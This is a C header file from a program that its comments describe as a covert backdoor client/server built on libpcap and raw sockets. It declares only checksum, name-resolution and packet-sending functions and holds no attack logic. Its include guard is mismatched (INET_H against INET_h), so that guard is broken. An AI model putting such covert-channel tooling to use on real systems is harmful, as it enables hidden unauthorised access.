#ifndef INET_H
#define INET_h

/*
SOURCE FILE: inet.h

PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.

DATE: November 29, 2011

REVISIONS:
	1.0 - October 23
	1.1 - November 29, 2011

DESIGNERS:
	Craig Rowland
	Modified by Santana Mach and Steve Stanisic

PROGRAMMERS:
	Craig Rowland
	Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to send packets using raw sockets.  In this
	program it is primarily used to craft UDP packets. The checksum functions are adapted
	from algorithms found on the internet.
*/

#include "defs.h"

uint getaddr(int sock, uint dst_addr);
/*
 * IP Checksum, adapted from various sources.
 */
uint16 ip_csum(uint16 *ip_hdr, int num_words);
/*
 * Based on Wikipedia discussion of UDP checksum.
 */
uint16 udp_csum(uint16 *ip_hdr, int num_words);
uint resolve(char *hostname);
void _send(uint32 dst_addr, uint16 data, uint16 dst_port, int chan);

#endif
